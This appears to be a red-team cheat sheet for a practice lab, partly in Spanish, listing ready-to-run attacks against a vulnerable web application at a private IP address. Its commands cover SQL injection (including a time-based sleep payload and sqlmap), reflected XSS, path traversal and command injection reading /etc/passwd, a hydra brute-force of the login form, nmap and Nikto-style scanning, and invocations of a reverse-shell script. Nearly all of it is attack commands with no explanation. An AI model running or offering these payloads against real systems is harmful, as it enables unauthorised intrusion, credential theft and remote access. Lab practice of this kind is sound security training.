1. SQLi:
	curl -i -X GET "http://192.168.122.144/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit"
	curl -i -X GET "http://192.168.122.144/vulnerabilities/sqli/?id=1'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))A)/*&Submit=Submit"

	sqlmap -u "http://192.168.122.144/index.php?id=1" --batch

2. Cross-site Scripting (XSS)
	curl -i -X GET "http://192.168.122.144/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
	curl -i -X GET "http://192.168.122.144/vulnerabilities/xss_r/?name=<img%20src=x%20onerror=alert(String.fromCharCode(88,83,83))>"

3. Inyección de comandos:
	curl -i -X GET "http://192.168.122.144/vulnerabilities/fi/?page=../../../../etc/passwd"
	curl -i -X POST "http://192.168.122.144/vulnerabilities/exec/" -d "ip=127.0.0.1;%20cat%20/etc/passwd&Submit=Submit"

4. Fuerza bruta:
	RedTeam: ~/scripts/anti-csrf.py

	hydra -l admin -P diccionario.txt 192.168.122.144 http-post-form "/login.php:user=^USER^&password=^PASS^&Login=Login:F=Login failed"
5. Escaner de vulnerabilidad:
	nmap 192.168.122.144
	curl -i -H "User-Agent: Nikto" "http://192.168.122.144/index.php"

6. Reverse-shell
	~/scripts/ataque_reverse_shell.sh escucha
	~/scripts/ataque_reverse_shell.sh ataque
